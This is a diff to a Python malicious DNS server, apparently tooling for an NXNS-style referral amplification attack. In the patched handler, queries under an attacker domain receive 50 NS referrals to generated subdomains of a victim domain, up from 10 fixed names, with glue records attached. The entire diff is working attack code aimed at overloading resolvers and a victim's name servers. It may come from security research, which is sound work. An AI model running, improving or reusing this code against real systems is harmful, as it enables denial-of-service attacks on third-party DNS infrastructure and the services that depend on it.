@@ -51,8 +51,6 @@ records = {
     attack_domain.mail: [A(IP)],
 }
 
-referral_responses = []
-
 
 def dns_response(data, client_ip):
     request = DNSRecord.parse(data)
@@ -85,9 +83,13 @@ def dns_response(data, client_ip):
     elif qn.endswith('.' + attack_domain):  # NXDomain
         val = 0  # TODO: random.choice([0, 1])
         if val == 0:
+            mp = qn.split('.')[-3]
+            referral_responses = []
+            for i in range(1, 51):
+                dom = mp + '-' + str(i) + '.' + victim_domain
+                referral_responses.append(NS(dom))
             for ind, rdata in enumerate(referral_responses):
                 reply.add_auth(RR(rname=DomainName(qn), rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
-                mp = qn.split('.')[-3]
                 referral_domain = DomainName(mp + '-' + str(ind+1) + '.' + victim_domain)
                 reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
         else:
@@ -196,7 +198,4 @@ def main():
 
 
 if __name__ == '__main__':
-    for i in range(1, 11):
-        dom = 'fake-' + str(i) + '.' + victim_domain
-        referral_responses.append(NS(dom))
     main()
